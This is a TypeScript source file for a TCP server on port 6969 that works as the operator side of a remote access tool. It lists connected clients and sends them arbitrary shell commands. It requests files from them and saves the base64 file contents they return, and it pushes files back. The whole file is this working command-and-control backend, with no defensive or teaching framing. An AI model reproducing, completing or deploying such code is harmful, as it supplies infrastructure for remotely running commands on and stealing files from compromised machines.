import * as net from 'net';
import * as readline from 'readline';
import * as fs from 'fs';
import * as path from 'path';

interface ConnectionInfo {
    cwd: string;
}

class TCPServer {
    private port: number;
    private server: net.Server;
    private rl: readline.Interface;
    private activeConnections: Map<net.Socket, ConnectionInfo>;

    constructor(port: number) {
        this.port = port;
        this.activeConnections = new Map<net.Socket, ConnectionInfo>();
        this.rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout
        });

        this.server = net.createServer();
        this.setupServer();
    }

    private setupServer(): void {
        this.server.on('connection', (sock: net.Socket) => this.handleConnection(sock));

        this.server.listen(this.port, () => {
            console.log(`TCP Server is running on port ${this.port}.`);
            this.showInitialOptions();
        });
    }

    private handleConnection(sock: net.Socket): void {
        this.activeConnections.set(sock, {
            cwd: process.cwd()
        });

        console.log(`[+] CONNECTED: ${sock.remoteAddress} : ${sock.remotePort}`);

        sock.on('data', (data: Buffer) => this.handleData(sock, data));
        sock.on('end', () => this.handleEnd(sock));
        sock.on('error', (err: Error) => this.handleError(sock, err));
    }

    private handleData(sock: net.Socket, data: Buffer): void {
        const message = data.toString('utf-8').trim();

        if (message.startsWith('Command output:') || message.startsWith('Error executing command:')) {
            console.log(`[Client ${sock.remoteAddress}:${sock.remotePort}]: ${message}`);
        } else if (message.startsWith('FILE_CONTENT:')) {
            const [_, filePath, fileData] = message.split(':');
            const fileBuffer = Buffer.from(fileData, 'base64'); // Decode base64 to binary data
            const fullPath = path.resolve(__dirname, path.basename(filePath));
            fs.writeFile(fullPath, fileBuffer, (err) => {
                if (err) {
                    console.log(`Error saving file: ${err.message}`);
                } else {
                    console.log(`File saved as: ${fullPath}`);
                }
            });
        } else if (message.startsWith('UPLOAD_FILE:')) {
            const filePath = message.slice('UPLOAD_FILE:'.length).trim();
            this.uploadFileToClient(sock, filePath);
        } else {
            console.log(`[Unknown message from client ${sock.remoteAddress}:${sock.remotePort}]: ${message}`);
        }
    }

    private uploadFileToClient(sock: net.Socket, filePath: string): void {
        const fullPath = path.resolve(filePath);
        fs.readFile(fullPath, (err, data) => {
            if (err) {
                sock.write(`Error reading file: ${err.message}`);
            } else {
                const base64Data = data.toString('base64'); // Encode binary data to base64
                sock.write(`FILE_CONTENT:${path.basename(filePath)}:${base64Data}`);
            }
        });
    }

    private handleEnd(sock: net.Socket): void {
        console.log(`[-] CONNECTION CLOSED: ${sock.remoteAddress}:${sock.remotePort}`);
        this.activeConnections.delete(sock);
    }

    private handleError(sock: net.Socket, err: Error): void {
        console.log(`[!] Error: ${sock.remoteAddress}: ${err.message}`);
    }

    private showInitialOptions(): void {
        console.log('Choose an option:\n1. Show all connections\n2. Exit');
        this.rl.question('Enter option > ', (option) => {
            if (option === '1') {
                this.showAllConnections();
            } else if (option === '2') {
                this.exitServer();
            } else {
                console.log('Invalid option. Please choose 1 or 2.');
                this.showInitialOptions();
            }
        });
    }

    private showAllConnections(): void {
        if (this.activeConnections.size === 0) {
            console.log('No active connections.');
            this.showInitialOptions();
        } else {
            console.log('Active connections:');
            Array.from(this.activeConnections.entries()).forEach(([sock, connInfo], index) => {
                console.log(`${index + 1}. ${sock.remoteAddress}:${sock.remotePort} (cwd: ${connInfo.cwd})`);
            });

            this.rl.question('Enter connection number to interact or press B to go back > ', (input) => {
                const trimmedInput = input.trim().toUpperCase();
                if (trimmedInput === 'B') {
                    this.showInitialOptions();
                } else {
                    const index = parseInt(trimmedInput) - 1;
                    const sock = Array.from(this.activeConnections.keys())[index];
                    if (sock) {
                        this.interactWithConnection(sock);
                    } else {
                        console.log('Invalid connection number.');
                        this.showAllConnections();
                    }
                }
            });
        }
    }

    private interactWithConnection(sock: net.Socket): void {
        console.log(`Interacting with ${sock.remoteAddress}:${sock.remotePort}`);

        const promptCommand = (): void => {
            this.rl.question('Enter command or "exit" to go back > ', (command) => {
                if (command.trim().toLowerCase() === 'exit') {
                    this.showInitialOptions();
                } else if (command.startsWith('download ')) {
                    const filePath = command.slice('download '.length).trim();
                    sock.write(`DOWNLOAD_FILE:${filePath}`);
                    promptCommand();
                } else if (command.startsWith('upload ')) {
                    const filePath = command.slice('upload '.length).trim();
                    this.uploadFileToClient(sock, filePath);
                    promptCommand();
                } else {
                    sock.write(`SHELL_COMMAND:${command}`);
                    promptCommand();
                }
            });
        };
        promptCommand();
    }

    private exitServer(): void {
        console.log('Exiting server...');
        this.activeConnections.forEach((_, sock) => sock.destroy());
        this.server.close(() => {
            process.exit(0);
        });
    }
}

const PORT = 6969;
const server = new TCPServer(PORT);
